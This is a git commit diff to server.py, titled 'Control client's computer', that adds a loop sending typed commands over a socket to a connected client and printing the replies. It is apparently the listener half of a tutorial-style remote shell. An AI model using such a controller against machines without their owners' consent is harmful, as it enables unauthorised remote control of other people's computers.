4cd162d324585fac36bc7d29362f057c4d2743f2
tanvir raj <rajbp02@gamil.com>
2017-09-12 12:27:32 +0600

    Control client's computer

--- server.py
+++ server.py
@@ -10,6 +10,7 @@ def socket_create():
         global s
         host = ''
         port = 9999
+        # allow computer to talk with another computer
         s = socket.socket()
     except socket.error as msg:
         print("Socket Creation error: " + str(msg))
@@ -23,6 +24,7 @@ def socket_bind():
         global s
         print("Binding socket to Port: " + str(port))
         s.bind((host, port))
+        # allow server to accept connection
         s.listen(5)
     except socket.error as msg:
         print("Socket Binding error: " + str(msg) + "\n" + "Retrying")
@@ -32,9 +34,29 @@ def socket_bind():
 # Establish a connection with client(socket must be Listening for them)
 def socket_accept():
     conn, address = s.accept()
-    print("Connection has been established + " + "IP" +
-          address[0] + "| PORT " + str(address[1]))
+    print("Connection has been established + " + "IP" + address[0] + "| PORT " + str(address[1]))
     send_commands(conn)
     conn.close()
 
 
+# send commands
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), 'utf-8')
+            print(client_response, end="")
+
+
+def main():
+    socket_create()
+    socket_bind()
+    socket_accept()
+
+
+main()
